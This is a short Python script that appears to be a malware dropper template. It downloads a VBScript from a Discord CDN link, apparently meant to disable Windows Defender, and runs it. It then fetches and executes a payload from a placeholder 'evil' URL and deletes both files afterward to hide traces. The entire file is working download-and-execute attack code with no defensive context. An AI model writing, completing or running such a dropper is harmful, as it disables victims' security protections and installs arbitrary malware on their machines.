import requests, subprocess, os, tempfile, time

evilfile = "%EVILURL%"
evilname = "%EVILNAME%"

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://cdn.discordapp.com/attachments/1032633191942586378/1032633328886624327/disablewindef.vbs")
subprocess.call("disablewindef.vbs", shell=True)
time.sleep(0.5)
download(evilfile)
subprocess.call(evilname, shell=True)


time.sleep(60)
os.remove(evilname)
os.remove("disablewindef.vbs")